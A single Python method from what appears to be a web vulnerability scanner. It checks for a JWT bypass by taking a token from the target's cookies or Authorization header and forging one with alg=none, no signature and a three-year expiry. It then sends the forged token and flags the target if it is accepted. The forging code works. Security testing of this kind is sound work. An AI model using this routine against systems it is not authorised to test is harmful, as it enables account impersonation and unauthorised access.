    def test_w9_jwt_clock_skew(self):
        """W9 #21 — JWT Clock Skew Bypass."""
        if not self.deep: return
        self._print("[*]", "W9: JWT Clock Skew...", "INFO")
        import base64, json as _json, time
        r = self._get(self.target)
        if not r: return
        cookies = r.cookies.get_dict() if hasattr(r.cookies, 'get_dict') else {}
        jwt_token = None
        for v in list(cookies.values()) + [r.headers.get("Authorization", "").replace("Bearer ", "")]:
            if v and v.count(".") == 2:
                jwt_token = v
                break
        if not jwt_token: return
        try:
            parts = jwt_token.split(".")
            payload = _json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
        except Exception: return
        # Forge with future exp (clock skew)
        evil_payload = dict(payload)
        evil_payload["exp"] = int(time.time()) + 94608000  # 3 years
        evil_payload["iat"] = int(time.time())
        payload_b64 = base64.urlsafe_b64encode(
            _json.dumps(evil_payload).encode()).decode().rstrip("=")
        header_b64 = base64.urlsafe_b64encode(
            _json.dumps({"alg": "none"}).encode()).decode().rstrip("=")
        evil_jwt = f"{header_b64}.{payload_b64}."
        r2 = self._get(self.target, headers={"Authorization": f"Bearer {evil_jwt}"})
        if r2 and r2.status_code == 200:
            self._add_vuln("W9 JWT Clock Skew Bypass",
                            "CRITICAL", self.target,
                            "Server accepted JWT with alg=none and long expiry")

